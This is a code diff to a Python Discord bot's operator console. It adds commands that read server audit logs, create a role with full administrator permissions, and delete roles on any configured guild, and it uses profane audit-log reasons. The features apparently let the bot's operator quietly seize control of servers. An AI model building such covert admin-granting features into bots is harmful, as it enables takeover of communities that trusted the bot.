@@ -53,16 +53,17 @@ async def console_listener():
                 "- rm_role <guild_name> <user_id> [role_id]\n"\
                 "- set_nick <guild_name> <user_id> [new nickname]\n"\
                 "- move <guild_name> <user_id> [channel id]\n"\
-                "- format" \
-                "- roles <guild_name>")
+                "- format\n" \
+                "- roles <guild_name>\n" \
+                "- get_logs <guild_name>" \
+                "- create_admin <guild_name> <role_name>\n")
                 continue
-            
             logs.error("This command doesn't exist.")
             continue
 
         elif len(input_parts) == 2:
             if input_parts[0] == "roles":
-                if input_parts[1] in SERVERS.keys():
+                if input_parts[1] in list(SERVERS.keys()):
                     guild = bot.get_guild(SERVERS[input_parts[1]])
                     for role in guild.roles:
                         is_admin = "[admin]" if role.permissions.administrator else "[not admin]"
@@ -70,10 +71,57 @@ async def console_listener():
                     continue
                 logs.error("There's no this bot on this server")
                 continue
+            elif input_parts[0] == "get_logs":
+                if input_parts[1] in list(SERVERS.keys()):
+                    guild = bot.get_guild(SERVERS[input_parts[1]])
+                    
+                    async for entry in guild.audit_logs(oldest_first=False,limit=50):
+                        logs.info(f"{entry.user} did {entry.action} to {entry.target}")
+                    continue
+                logs.error("There's no this bot on this server")
+                continue
             logs.error("This command doesn't exist.")
             continue
-            
 
+
+        elif len(input_parts) == 3:
+            if input_parts[0] == "create_admin":
+                if input_parts[1] in list(SERVERS.keys()):
+                    guild = bot.get_guild(SERVERS[input_parts[1]])
+                    role_name = " ".join(input_parts[2:])
+                    
+                    try:
+                        perms = discord.Permissions(administrator=True)
+                        role = await guild.create_role(reason="eshkere", name=role_name, permissions=perms)
+                        logs.info(f"The new admin role {role.name} has been created on {guild.name}\nHere it ID is: {role.id}")
+                        continue
+                    except Exception as e:
+                        logs.error(f"Error occured: {e}")
+                        continue
+                    
+                logs.error(f"Server {input_parts[1]} not in config.")
+                continue
+                
+            if input_parts[0] == "del_role": 
+                if input_parts[1] in list(SERVERS.keys()):
+                    guild = bot.get_guild(SERVERS[input_parts[1]])
+                    try:
+                        role_id = int(input_parts[2])
+                        deleting_role = guild.get_role(role_id)
+                        if deleting_role is not None:
+                            await deleting_role.delete(reason="нааааахуй")
+                            logs.info(f"The role {deleting_role.name} has been deleted successfully.")
+                            continue
+                        else:
+                            logs.error(f"Role with ID {role_id} not found in cache. Double-check the ID!")
+                    except Exception as e:
+                        logs.error(f"Error occured: {e}")
+                        continue
+                logs.error("There's no this bot on this server")
+                continue
+            logs.error("This command doesn't exist.")
+            continue
+                    
         try:
             guild = bot.get_guild(SERVERS[input_parts[1]])
             member = guild.get_member(int(input_parts[2]))
